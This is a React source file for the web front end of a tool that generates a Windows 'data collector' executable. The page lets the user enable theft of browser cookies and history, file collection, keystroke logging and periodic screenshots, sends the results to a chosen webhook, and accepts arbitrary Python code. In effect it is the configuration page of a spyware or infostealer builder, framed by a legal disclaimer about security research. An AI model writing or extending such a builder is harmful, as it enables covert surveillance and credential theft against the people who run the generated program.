import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { z } from "zod";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Checkbox } from "@/components/ui/checkbox";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Download, FileCode2, Shield, Monitor, HardDrive } from "lucide-react";

const exeCreatorSchema = z.object({
  exeName: z.string().min(1, "Executable name is required"),
  description: z.string().min(1, "Description is required"),
  collectBrowserData: z.boolean().default(false),
  collectSystemInfo: z.boolean().default(false),
  collectFiles: z.boolean().default(false),
  collectKeystrokes: z.boolean().default(false),
  collectScreenshots: z.boolean().default(false),
  outputFormat: z.enum(["json", "csv", "txt"]).default("json"),
  webhookUrl: z.string().url("Must be a valid URL").optional().or(z.literal("")),
  customCode: z.string().optional(),
  fileExtensions: z.string().optional(),
  screenshotInterval: z.number().min(1).max(3600).optional(),
});

type ExeCreator = z.infer<typeof exeCreatorSchema>;

export function ExeCreator() {
  const { toast } = useToast();
  const [isGenerating, setIsGenerating] = useState(false);

  const form = useForm<ExeCreator>({
    resolver: zodResolver(exeCreatorSchema),
    defaultValues: {
      exeName: "",
      description: "",
      collectBrowserData: false,
      collectSystemInfo: false,
      collectFiles: false,
      collectKeystrokes: false,
      collectScreenshots: false,
      outputFormat: "json",
      webhookUrl: "",
      customCode: "",
      fileExtensions: "",
      screenshotInterval: 60,
    },
  });

  const generateExeMutation = useMutation({
    mutationFn: async (data: ExeCreator) => {
      const response = await apiRequest("/api/generate-exe", {
        method: "POST",
        body: JSON.stringify(data),
      });
      return response;
    },
    onSuccess: (response) => {
      if (response.success) {
        // Create download link
        const blob = new Blob([atob(response.exeFile)], { type: "application/octet-stream" });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = `${form.getValues("exeName")}.exe`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);
        
        toast({
          title: "Success!",
          description: "Data collector executable generated and downloaded successfully.",
        });
      }
    },
    onError: (error: any) => {
      toast({
        title: "Generation Failed",
        description: error.message || "Failed to generate executable",
        variant: "destructive",
      });
    },
    onSettled: () => {
      setIsGenerating(false);
    },
  });

  const onSubmit = async (data: ExeCreator) => {
    setIsGenerating(true);
    generateExeMutation.mutate(data);
  };

  const dataCollectionFeatures = [
    {
      key: "collectBrowserData" as const,
      label: "Browser Data",
      description: "Collect browser history, bookmarks, and cookies",
      icon: <Monitor className="h-4 w-4" />,
    },
    {
      key: "collectSystemInfo" as const,
      label: "System Information",
      description: "Collect OS info, hardware specs, and running processes",
      icon: <HardDrive className="h-4 w-4" />,
    },
    {
      key: "collectFiles" as const,
      label: "File Collection",
      description: "Collect files from specified directories",
      icon: <FileCode2 className="h-4 w-4" />,
    },
    {
      key: "collectKeystrokes" as const,
      label: "Keystroke Logging",
      description: "Log keystrokes (use responsibly)",
      icon: <Shield className="h-4 w-4" />,
    },
    {
      key: "collectScreenshots" as const,
      label: "Screenshots",
      description: "Capture periodic screenshots",
      icon: <Monitor className="h-4 w-4" />,
    },
  ];

  return (
    <div className="container mx-auto p-6 space-y-6" data-testid="page-exe-creator">
      <div className="text-center space-y-2">
        <h1 className="text-3xl font-bold" data-testid="title-exe-creator">
          Data Collector Executable Generator
        </h1>
        <p className="text-muted-foreground" data-testid="subtitle-exe-creator">
          Generate custom data collection executables for security research and testing
        </p>
      </div>

      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Download className="h-5 w-5" />
            Executable Configuration
          </CardTitle>
          <CardDescription>
            Configure your data collection executable with custom features and settings
          </CardDescription>
        </CardHeader>
        <CardContent>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
            {/* Basic Information */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="exeName">Executable Name</Label>
                <Input
                  id="exeName"
                  data-testid="input-exe-name"
                  placeholder="e.g., DataCollector"
                  {...form.register("exeName")}
                />
                {form.formState.errors.exeName && (
                  <p className="text-sm text-destructive" data-testid="error-exe-name">
                    {form.formState.errors.exeName.message}
                  </p>
                )}
              </div>

              <div className="space-y-2">
                <Label htmlFor="outputFormat">Output Format</Label>
                <Select
                  value={form.watch("outputFormat")}
                  onValueChange={(value: "json" | "csv" | "txt") => form.setValue("outputFormat", value)}
                >
                  <SelectTrigger data-testid="select-output-format">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="json">JSON</SelectItem>
                    <SelectItem value="csv">CSV</SelectItem>
                    <SelectItem value="txt">Plain Text</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </div>

            <div className="space-y-2">
              <Label htmlFor="description">Description</Label>
              <Textarea
                id="description"
                data-testid="textarea-description"
                placeholder="Describe what this executable will collect and its purpose..."
                {...form.register("description")}
              />
              {form.formState.errors.description && (
                <p className="text-sm text-destructive" data-testid="error-description">
                  {form.formState.errors.description.message}
                </p>
              )}
            </div>

            {/* Data Collection Features */}
            <div className="space-y-4">
              <Label className="text-base font-semibold">Data Collection Features</Label>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {dataCollectionFeatures.map((feature) => (
                  <div key={feature.key} className="flex items-start space-x-3 p-4 border rounded-lg">
                    <Checkbox
                      id={feature.key}
                      data-testid={`checkbox-${feature.key}`}
                      checked={form.watch(feature.key)}
                      onCheckedChange={(checked) => form.setValue(feature.key, !!checked)}
                    />
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-1">
                        {feature.icon}
                        <Label htmlFor={feature.key} className="font-medium">
                          {feature.label}
                        </Label>
                      </div>
                      <p className="text-sm text-muted-foreground">{feature.description}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Conditional Settings */}
            {form.watch("collectFiles") && (
              <div className="space-y-2">
                <Label htmlFor="fileExtensions">File Extensions to Collect</Label>
                <Input
                  id="fileExtensions"
                  data-testid="input-file-extensions"
                  placeholder="e.g., .txt,.pdf,.doc (leave empty for all)"
                  {...form.register("fileExtensions")}
                />
              </div>
            )}

            {form.watch("collectScreenshots") && (
              <div className="space-y-2">
                <Label htmlFor="screenshotInterval">Screenshot Interval (seconds)</Label>
                <Input
                  id="screenshotInterval"
                  data-testid="input-screenshot-interval"
                  type="number"
                  min="1"
                  max="3600"
                  {...form.register("screenshotInterval", { valueAsNumber: true })}
                />
              </div>
            )}

            {/* Webhook Configuration */}
            <div className="space-y-2">
              <Label htmlFor="webhookUrl">
                Webhook URL <span className="text-muted-foreground">(optional)</span>
              </Label>
              <Input
                id="webhookUrl"
                data-testid="input-webhook-url"
                type="url"
                placeholder="https://your-server.com/webhook"
                {...form.register("webhookUrl")}
              />
              {form.formState.errors.webhookUrl && (
                <p className="text-sm text-destructive" data-testid="error-webhook-url">
                  {form.formState.errors.webhookUrl.message}
                </p>
              )}
              <p className="text-sm text-muted-foreground">
                Optional: Collected data will be sent to this URL in real-time
              </p>
            </div>

            {/* Custom Code */}
            <div className="space-y-2">
              <Label htmlFor="customCode">
                Custom Code <span className="text-muted-foreground">(optional)</span>
              </Label>
              <Textarea
                id="customCode"
                data-testid="textarea-custom-code"
                placeholder="Add custom Python code to extend functionality..."
                rows={6}
                {...form.register("customCode")}
              />
              <p className="text-sm text-muted-foreground">
                Add custom Python code that will be executed by the data collector
              </p>
            </div>

            {/* Generate Button */}
            <Button
              type="submit"
              size="lg"
              className="w-full"
              disabled={isGenerating}
              data-testid="button-generate-exe"
            >
              {isGenerating ? (
                <>
                  <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2" />
                  Generating Executable...
                </>
              ) : (
                <>
                  <Download className="h-4 w-4 mr-2" />
                  Generate Data Collector
                </>
              )}
            </Button>
          </form>
        </CardContent>
      </Card>

      {/* Warning Card */}
      <Card className="border-yellow-200 bg-yellow-50 dark:border-yellow-800 dark:bg-yellow-950">
        <CardHeader>
          <CardTitle className="flex items-center gap-2 text-yellow-800 dark:text-yellow-200">
            <Shield className="h-5 w-5" />
            Important Legal Notice
          </CardTitle>
        </CardHeader>
        <CardContent className="text-yellow-700 dark:text-yellow-300">
          <p>
            This tool is intended for legitimate security research, penetration testing, and educational purposes only.
            Users are responsible for ensuring compliance with all applicable laws and regulations.
            Unauthorized data collection may violate privacy laws and computer fraud statutes.
          </p>
        </CardContent>
      </Card>
    </div>
  );
}